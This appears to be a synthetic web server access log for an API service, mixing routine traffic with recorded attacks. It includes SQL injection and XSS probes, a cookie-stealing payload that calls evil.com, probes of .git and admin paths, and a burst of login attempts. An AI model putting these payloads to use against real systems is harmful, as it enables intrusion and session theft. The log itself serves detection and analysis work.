49.205.34.78 - - [14/Jun/2026:07:48:53 +0530] "GET /api/v2/notifications HTTP/1.1" 200 38553 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.344
61.246.78.34 - - [14/Jun/2026:08:16:57 +0530] "GET /api/v2/trending HTTP/1.1" 200 10023 "https://github.com" "okhttp/4.12.0" rt=0.412
103.195.201.34 - - [14/Jun/2026:09:50:35 +0530] "PUT /api/v2/admin/stats HTTP/1.1" 200 5727 "https://api.example.com/docs" "okhttp/4.12.0" rt=0.338
61.246.78.34 - - [14/Jun/2026:10:28:15 +0530] "GET /api/v2/notifications HTTP/1.1" 200 68915 "https://dashboard.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.814
219.91.134.67 - - [14/Jun/2026:11:01:16 +0530] "GET /ready HTTP/1.1" 304 781 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.497
175.101.120.56 - api-client [14/Jun/2026:12:06:52 +0530] "OPTIONS /assets/images/banner.webp HTTP/1.1" 200 72672 "https://dashboard.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.038
110.234.52.100 - - [14/Jun/2026:12:37:54 +0530] "GET /health HTTP/1.1" 200 29984 "https://dashboard.example.com" "axios/1.6.7" rt=0.865
27.56.145.23 - - [14/Jun/2026:13:16:01 +0530] "GET /api/v2/orders HTTP/1.1" 200 40918 "https://dashboard.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.329
117.96.78.45 - - [14/Jun/2026:14:30:28 +0530] "DELETE /api/v2/users HTTP/1.1" 200 55301 "https://api.example.com/docs" "okhttp/4.12.0" rt=1.042
72.14.192.10 - - [14/Jun/2026:16:35:07 +0530] "DELETE /static/vendors.js HTTP/1.1" 304 185 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.082
180.151.34.78 - api-client [14/Jun/2026:17:22:39 +0530] "POST /api/v2/search?q=laptop HTTP/1.1" 201 25447 "https://app.example.com" "axios/1.6.7" rt=0.373
180.151.34.78 - - [14/Jun/2026:18:08:50 +0530] "GET /api/v2/orders HTTP/1.1" 301 261 "https://dashboard.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.476
109.201.133.195 - - [14/Jun/2026:22:15:01 +0530] "POST /api/v2/users?id=1 AND SLEEP(5)-- HTTP/1.1" 404 2645 "-" "Nikto/2.1.6" rt=0.090
109.201.133.195 - - [14/Jun/2026:22:15:20 +0530] "GET /api/v2/orders?id=1; DROP TABLE orders-- HTTP/1.1" 404 515 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=0.688
109.201.133.195 - - [14/Jun/2026:22:15:21 +0530] "GET /.git/HEAD HTTP/1.1" 422 3749 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=1.123
109.201.133.195 - - [14/Jun/2026:22:15:36 +0530] "POST /admin/ HTTP/1.1" 422 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.646
109.201.133.195 - - [14/Jun/2026:22:15:55 +0530] "POST /api/v2/search?q=<script>alert(1)</script> HTTP/1.1" 403 2068 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.249
109.201.133.195 - - [14/Jun/2026:22:16:07 +0530] "POST /api/v2/users?search=<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)> HTTP/1.1" 404 2314 "-" "Nikto/2.1.6" rt=1.866
109.201.133.195 - - [14/Jun/2026:22:16:07 +0530] "POST /console HTTP/1.1" 200 3524 "-" "Nikto/2.1.6" rt=0.647
109.201.133.195 - - [14/Jun/2026:22:16:40 +0530] "GET /api/v2/users?id=1 AND SLEEP(5)-- HTTP/1.1" 400 2762 "-" "Nikto/2.1.6" rt=1.801
109.201.133.195 - - [14/Jun/2026:22:17:10 +0530] "GET /api/v2/users?id=1' OR '1'='1 HTTP/1.1" 200 2579 "-" "Nikto/2.1.6" rt=0.067
109.201.133.195 - - [14/Jun/2026:22:18:17 +0530] "POST /api/v2/users?id=1 AND SLEEP(5)-- HTTP/1.1" 403 616 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=1.214
109.201.133.195 - - [14/Jun/2026:22:18:33 +0530] "POST /actuator/env HTTP/1.1" 403 567 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.260
109.201.133.195 - - [14/Jun/2026:22:18:33 +0530] "GET /api/v2/orders?id=1; DROP TABLE orders-- HTTP/1.1" 404 3335 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=0.785
109.201.133.195 - - [14/Jun/2026:22:18:57 +0530] "GET /.git/HEAD HTTP/1.1" 422 278 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.371
109.201.133.195 - - [14/Jun/2026:22:19:01 +0530] "GET /api/v2/users?id=1' OR '1'='1 HTTP/1.1" 400 764 "-" "Nikto/2.1.6" rt=1.752
109.201.133.195 - - [14/Jun/2026:22:19:21 +0530] "GET /api/v2/users?search=<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)> HTTP/1.1" 404 3154 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)" rt=0.265
109.201.133.195 - - [14/Jun/2026:22:19:41 +0530] "POST /api/v2/search?q=<script>alert(1)</script> HTTP/1.1" 404 1160 "-" "Nikto/2.1.6" rt=0.814
125.63.44.12 - - [14/Jun/2026:23:15:31 +0530] "DELETE /api/v2/admin/stats HTTP/1.1" 200 58605 "https://github.com" "okhttp/4.12.0" rt=0.824
72.14.192.10 - - [14/Jun/2026:23:31:09 +0530] "GET /api/v2/orders HTTP/1.1" 304 286 "https://github.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.794
122.177.99.45 - - [15/Jun/2026:00:06:13 +0530] "GET /metrics HTTP/1.1" 301 713 "https://dashboard.example.com" "okhttp/4.12.0" rt=1.025
49.205.34.78 - - [15/Jun/2026:00:36:59 +0530] "GET /api/v2/products/search HTTP/1.1" 200 17544 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.239
49.205.34.78 - - [15/Jun/2026:00:40:53 +0530] "DELETE /api/v2/orders/history HTTP/1.1" 200 11356 "-" "okhttp/4.12.0" rt=0.845
210.18.55.34 - - [15/Jun/2026:00:42:04 +0530] "GET /api/v2/export/users HTTP/1.1" 200 27909707 "https://github.com" "okhttp/4.12.0" rt=4.306
162.142.125.24 - - [15/Jun/2026:04:20:36 +0530] "GET /v1/secret/data HTTP/1.1" 404 314 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" rt=0.271
122.177.99.45 - api-client [15/Jun/2026:04:31:53 +0530] "PUT /ready HTTP/1.1" 200 70120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.074
180.151.34.78 - - [15/Jun/2026:05:29:27 +0530] "GET /metrics HTTP/1.1" 200 25772 "https://app.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.288
103.7.112.45 - - [15/Jun/2026:05:47:42 +0530] "DELETE /assets/images/banner.webp HTTP/1.1" 200 28593 "-" "okhttp/4.12.0" rt=0.234
74.125.224.89 - api-client [15/Jun/2026:06:50:27 +0530] "GET /api/v2/config HTTP/1.1" 301 147 "https://app.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=1.411
103.7.112.45 - - [15/Jun/2026:07:05:44 +0530] "POST / HTTP/1.1" 201 2069 "https://app.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.843
223.226.45.12 - - [15/Jun/2026:07:12:26 +0530] "GET /static/bundle.js HTTP/1.1" 301 102 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.233
162.142.125.24 - - [15/Jun/2026:07:54:32 +0530] "GET /config.json HTTP/1.1" 301 474 "-" "curl/7.88.1" rt=0.132
167.94.138.35 - - [15/Jun/2026:08:02:15 +0530] "GET /phpmyadmin/ HTTP/1.1" 404 427 "-" "Go-http-client/1.1" rt=0.457
49.205.34.78 - api-client [15/Jun/2026:08:53:48 +0530] "POST /api/v2/users HTTP/1.1" 200 58730 "https://dashboard.example.com" "okhttp/4.12.0" rt=0.628
72.14.192.10 - - [15/Jun/2026:09:39:01 +0530] "DELETE /api/v2/feed HTTP/1.1" 301 52 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.575
210.18.55.34 - - [15/Jun/2026:11:08:07 +0530] "GET /ws/notifications HTTP/1.1" 301 242 "https://app.example.com" "okhttp/4.12.0" rt=0.283
103.7.112.45 - - [15/Jun/2026:11:34:23 +0530] "POST /metrics HTTP/1.1" 201 23016 "https://www.google.com/" "okhttp/4.12.0" rt=0.899
223.226.45.12 - - [15/Jun/2026:11:38:29 +0530] "GET /api/v2/feed HTTP/1.1" 200 62146 "https://app.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.381
72.14.192.10 - - [15/Jun/2026:12:58:33 +0530] "GET /api/v2/reports/financial HTTP/1.1" 200 62069212 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=8.174
49.205.34.78 - api-client [15/Jun/2026:14:41:59 +0530] "GET /api/v2/notifications HTTP/1.1" 200 62420 "https://github.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.328
180.151.34.78 - api-client [15/Jun/2026:14:52:26 +0530] "POST /metrics HTTP/1.1" 204 189 "https://api.example.com/docs" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.482
210.18.55.34 - - [15/Jun/2026:15:33:55 +0530] "GET /api/v2/reports/financial HTTP/1.1" 200 16394287 "https://github.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=8.824
103.7.112.45 - - [15/Jun/2026:16:57:03 +0530] "GET /api/v2/products/search HTTP/1.1" 200 19373 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.802
175.101.120.56 - - [15/Jun/2026:23:55:54 +0530] "PUT /metrics HTTP/1.1" 204 647 "https://app.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.926
27.56.145.23 - - [16/Jun/2026:00:03:24 +0530] "GET / HTTP/1.1" 200 24718 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.870
72.14.192.10 - api-client [16/Jun/2026:01:22:20 +0530] "HEAD /ready HTTP/1.1" 200 67767 "https://github.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.517
5.188.206.14 - - [16/Jun/2026:02:00:00 +0530] "POST /api/v2/auth/token HTTP/1.1" 422 204 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.281
5.188.206.14 - - [16/Jun/2026:02:00:01 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 219 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.027
5.188.206.14 - - [16/Jun/2026:02:00:02 +0530] "POST /api/v2/auth/token HTTP/1.1" 422 295 "-" "axios/1.6.7" rt=0.152
5.188.206.14 - - [16/Jun/2026:02:00:02 +0530] "POST /api/v2/auth/token HTTP/1.1" 422 110 "-" "axios/1.6.7" rt=0.269
5.188.206.14 - - [16/Jun/2026:02:00:05 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 304 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.185
5.188.206.14 - - [16/Jun/2026:02:00:09 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 373 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.115
5.188.206.14 - - [16/Jun/2026:02:00:09 +0530] "POST /api/v2/auth/token HTTP/1.1" 403 209 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.207
5.188.206.14 - - [16/Jun/2026:02:00:09 +0530] "POST /api/v2/auth/token HTTP/1.1" 422 418 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.142
5.188.206.14 - - [16/Jun/2026:02:00:10 +0530] "POST /api/v2/auth/token HTTP/1.1" 422 267 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.125
5.188.206.14 - - [16/Jun/2026:02:00:13 +0530] "POST /api/v2/auth/token HTTP/1.1" 403 257 "-" "axios/1.6.7" rt=0.012
5.188.206.14 - - [16/Jun/2026:02:00:13 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 121 "-" "python-requests/2.31.0" rt=0.057
5.188.206.14 - - [16/Jun/2026:02:00:14 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 433 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.271
5.188.206.14 - - [16/Jun/2026:02:00:15 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 492 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.138
5.188.206.14 - - [16/Jun/2026:02:00:19 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 251 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.057
5.188.206.14 - - [16/Jun/2026:02:00:20 +0530] "POST /api/v2/auth/token HTTP/1.1" 422 111 "-" "okhttp/4.12.0" rt=0.045
5.188.206.14 - - [16/Jun/2026:02:00:24 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 295 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.081
5.188.206.14 - - [16/Jun/2026:02:00:25 +0530] "POST /api/v2/auth/token HTTP/1.1" 403 120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.198
5.188.206.14 - - [16/Jun/2026:02:00:27 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 210 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.099
5.188.206.14 - - [16/Jun/2026:02:00:30 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 175 "-" "python-requests/2.31.0" rt=0.068
5.188.206.14 - - [16/Jun/2026:02:00:33 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 239 "-" "okhttp/4.12.0" rt=0.069
5.188.206.14 - - [16/Jun/2026:02:00:34 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 205 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.060
5.188.206.14 - - [16/Jun/2026:02:00:35 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 477 "-" "okhttp/4.12.0" rt=0.283
5.188.206.14 - - [16/Jun/2026:02:00:38 +0530] "POST /api/v2/auth/token HTTP/1.1" 403 266 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.165
5.188.206.14 - - [16/Jun/2026:02:00:43 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 202 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.211
5.188.206.14 - - [16/Jun/2026:02:00:43 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.052
5.188.206.14 - - [16/Jun/2026:02:00:45 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 173 "-" "axios/1.6.7" rt=0.095
5.188.206.14 - - [16/Jun/2026:02:00:48 +0530] "POST /api/v2/auth/token HTTP/1.1" 401 399 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.153
5.188.206.14 - - [16/Jun/2026:02:00:52 +0530] "POST /api/v2/auth/token HTTP/1.1" 403 242 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.292
110.234.52.100 - - [16/Jun/2026:02:19:27 +0530] "POST /assets/images/banner.webp HTTP/1.1" 200 60408 "https://app.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.127
27.56.145.23 - api-client [16/Jun/2026:02:37:31 +0530] "POST /api/v2/config HTTP/1.1" 201 37599 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.484
49.205.34.78 - - [16/Jun/2026:02:53:35 +0530] "POST /ws/notifications HTTP/1.1" 201 45651 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.027
125.63.44.12 - api-client [16/Jun/2026:03:01:27 +0530] "POST /api/v2/notifications HTTP/1.1" 201 28384 "https://api.example.com/docs" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.050
103.195.201.34 - - [16/Jun/2026:03:51:35 +0530] "HEAD /api/v2/users HTTP/1.1" 200 56681 "https://api.example.com/docs" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.424
49.205.34.78 - - [16/Jun/2026:06:40:56 +0530] "HEAD /static/style.css HTTP/1.1" 201 28803 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.055
117.96.78.45 - - [16/Jun/2026:06:45:33 +0530] "PUT /static/bundle.js HTTP/1.1" 200 72545 "https://dashboard.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.337
122.177.99.45 - - [16/Jun/2026:06:53:05 +0530] "POST /api/v2/products/search HTTP/1.1" 200 65406 "https://github.com" "okhttp/4.12.0" rt=1.125
223.226.45.12 - - [16/Jun/2026:07:36:24 +0530] "GET /api/v2/feed HTTP/1.1" 304 419 "-" "okhttp/4.12.0" rt=0.616
110.234.52.100 - - [16/Jun/2026:08:39:19 +0530] "OPTIONS /api/v2/payments HTTP/1.1" 200 63570 "https://api.example.com/docs" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.683
219.91.134.67 - - [16/Jun/2026:10:12:19 +0530] "HEAD /api/v2/auth/token HTTP/1.1" 200 17228 "https://api.example.com/docs" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.577
61.246.78.34 - - [16/Jun/2026:10:27:24 +0530] "OPTIONS /metrics HTTP/1.1" 200 38373 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.783
185.156.73.54 - - [16/Jun/2026:11:56:00 +0530] "GET /api/v2/internal HTTP/1.1" 404 665 "-" "python-requests/2.31.0" rt=0.092
72.14.192.10 - - [16/Jun/2026:12:15:41 +0530] "POST /api/v2/analytics/raw HTTP/1.1" 200 73534588 "https://dashboard.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=7.540
103.7.112.45 - - [16/Jun/2026:14:37:51 +0530] "GET /static/style.css HTTP/1.1" 200 59839 "https://github.com" "axios/1.6.7" rt=0.367
167.94.138.35 - - [16/Jun/2026:15:18:31 +0530] "GET /phpmyadmin/ HTTP/1.1" 404 540 "-" "python-requests/2.31.0" rt=0.001
103.7.112.45 - api-client [16/Jun/2026:15:37:02 +0530] "OPTIONS /static/style.css HTTP/1.1" 200 70422 "https://github.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.169
180.151.34.78 - api-client [16/Jun/2026:16:24:07 +0530] "PUT /api/v2/cart HTTP/1.1" 301 285 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.717
162.142.125.24 - - [16/Jun/2026:16:32:07 +0530] "GET /phpmyadmin/ HTTP/1.1" 404 723 "-" "curl/7.88.1" rt=0.374
117.96.78.45 - - [16/Jun/2026:16:39:51 +0530] "GET /assets/images/banner.webp HTTP/1.1" 201 76817 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.398
162.142.125.24 - - [16/Jun/2026:23:10:13 +0530] "GET /v1/secret/data HTTP/1.1" 200 567 "-" "Go-http-client/1.1" rt=0.341
103.195.201.34 - - [16/Jun/2026:23:35:25 +0530] "GET /api/v2/users/profile HTTP/1.1" 200 69613 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.248
74.125.224.89 - - [17/Jun/2026:00:10:48 +0530] "GET /api/v2/users HTTP/1.1" 301 533 "https://github.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.059
110.234.52.100 - - [17/Jun/2026:03:39:15 +0530] "GET /static/vendors.js HTTP/1.1" 200 35608 "https://api.example.com/docs" "axios/1.6.7" rt=1.333
36.255.89.23 - api-client [17/Jun/2026:04:17:29 +0530] "POST /static/vendors.js HTTP/1.1" 304 86 "https://www.google.com/" "okhttp/4.12.0" rt=0.332
49.205.34.78 - - [17/Jun/2026:04:20:50 +0530] "GET /static/vendors.js HTTP/1.1" 301 682 "https://dashboard.example.com" "okhttp/4.12.0" rt=0.894
1.186.34.56 - - [17/Jun/2026:04:48:04 +0530] "GET /static/bundle.js HTTP/1.1" 200 15115 "https://api.example.com/docs" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.274
74.125.224.89 - - [17/Jun/2026:04:55:47 +0530] "HEAD /api/v2/users HTTP/1.1" 200 21642 "https://api.example.com/docs" "okhttp/4.12.0" rt=0.177
223.226.45.12 - - [17/Jun/2026:07:00:30 +0530] "OPTIONS /static/bundle.js HTTP/1.1" 200 27564 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.939
74.125.224.89 - api-client [17/Jun/2026:07:58:42 +0530] "POST / HTTP/1.1" 200 6449 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.599
103.7.112.45 - api-client [17/Jun/2026:09:24:44 +0530] "POST /ws/notifications HTTP/1.1" 200 22319 "https://github.com" "okhttp/4.12.0" rt=0.639
1.186.34.56 - api-client [17/Jun/2026:09:26:07 +0530] "POST /api/v2/products HTTP/1.1" 200 19211 "-" "axios/1.6.7" rt=0.421
210.18.55.34 - - [17/Jun/2026:10:00:42 +0530] "PUT /api/v2/analytics/summary HTTP/1.1" 200 21910 "https://app.example.com" "axios/1.6.7" rt=0.653
210.18.55.34 - - [17/Jun/2026:10:28:26 +0530] "PUT /static/bundle.js HTTP/1.1" 200 20299 "https://app.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.190
27.56.145.23 - - [17/Jun/2026:11:16:53 +0530] "PUT /api/v2/trending HTTP/1.1" 200 70564 "https://github.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.151
219.91.134.67 - - [17/Jun/2026:12:43:51 +0530] "GET /api/v2/users HTTP/1.1" 304 158 "https://www.google.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.041
110.234.52.100 - - [17/Jun/2026:13:13:47 +0530] "POST /api/v2/products HTTP/1.1" 304 344 "https://github.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.099
219.91.134.67 - - [17/Jun/2026:13:41:27 +0530] "GET /assets/images/banner.webp HTTP/1.1" 200 74637 "https://github.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.337
110.234.52.100 - - [17/Jun/2026:15:08:23 +0530] "PUT /api/v2/orders/history HTTP/1.1" 200 5604 "https://www.google.com/" "axios/1.6.7" rt=1.077
49.205.34.78 - - [17/Jun/2026:15:25:05 +0530] "DELETE /ws/notifications HTTP/1.1" 200 23817 "https://app.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" rt=0.893
103.195.201.34 - - [17/Jun/2026:17:47:22 +0530] "GET /static/style.css HTTP/1.1" 304 108 "https://api.example.com/docs" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.103
117.96.78.45 - - [17/Jun/2026:18:49:27 +0530] "GET /metrics HTTP/1.1" 200 79556 "https://dashboard.example.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=1.284
175.101.120.56 - - [17/Jun/2026:19:29:35 +0530] "DELETE /api/v2/auth/token HTTP/1.1" 200 54835 "https://github.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.301
